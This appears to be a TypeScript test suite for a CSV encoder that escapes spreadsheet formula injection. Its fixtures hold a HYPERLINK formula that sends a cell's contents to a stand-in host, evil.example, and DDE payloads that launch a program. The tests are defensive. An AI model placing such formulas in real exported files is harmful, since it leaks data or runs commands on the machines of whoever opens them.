import { csvCell, csvWords } from './csv';

describe('a CSV file’s cells: words a spreadsheet would run as a formula stay words (S-M1)', () => {
  it('keeps the audit’s formulas as words, a ' + "'" + ' before each, quoted where the file needs it', () => {
    expect(csvCell('=HYPERLINK("https://evil.example/?d="&A3,"Open")')).toBe(`"'=HYPERLINK(""https://evil.example/?d=""&A3,""Open"")"`);
    expect(csvCell("+1+cmd|' /C calc'!A0")).toBe("'+1+cmd|' /C calc'!A0");
    expect(csvCell("@SUM(1+1)*cmd|' /C calc'!A0")).toBe("'@SUM(1+1)*cmd|' /C calc'!A0");
    expect(csvCell('-2+3')).toBe("'-2+3");
    // A tab or a line return first, and the fullwidth forms a spreadsheet reads as the same.
    expect(csvCell('\t=1+1')).toBe("'\t=1+1");
    expect(csvCell('\r=1+1')).toBe(`"'\r=1+1"`);
    for (const start of ['＝', '＋', '－', '＠']) expect(csvCell(`${start}SUM(A1)`)).toBe(`'${start}SUM(A1)`);
  });

  it('writes a number as a number, and other words as they are', () => {
    expect(csvCell({ number: '-2.50' })).toBe('-2.50');
    expect(csvCell({ number: '-2,50' }, ';')).toBe('-2,50');
    for (const words of ['Acme', 'a=b', '2026-10-15', "it's", "'quoted"]) expect(csvCell(words)).toBe(words);
    expect(csvCell('Cairo, Egypt')).toBe('"Cairo, Egypt"');
    expect(csvCell('Cairo, Egypt', ';')).toBe('Cairo, Egypt');
    expect(csvCell('a;b', ',;\t')).toBe('"a;b"');
  });

  it('reads each cell back as it was written, a ' + "'" + ' a person typed kept', () => {
    for (const words of ['=SUM(A1)', '+20 100 123 4567', '-5 apples', '@mona', '＝x', "'=x", "''+y", "'plain", 'plain']) {
      const written = csvCell(words, '').replace(/^"([\s\S]*)"$/, (_, inner: string) => inner.replace(/""/g, '"'));
      expect(csvWords(written)).toBe(words);
    }
  });
});
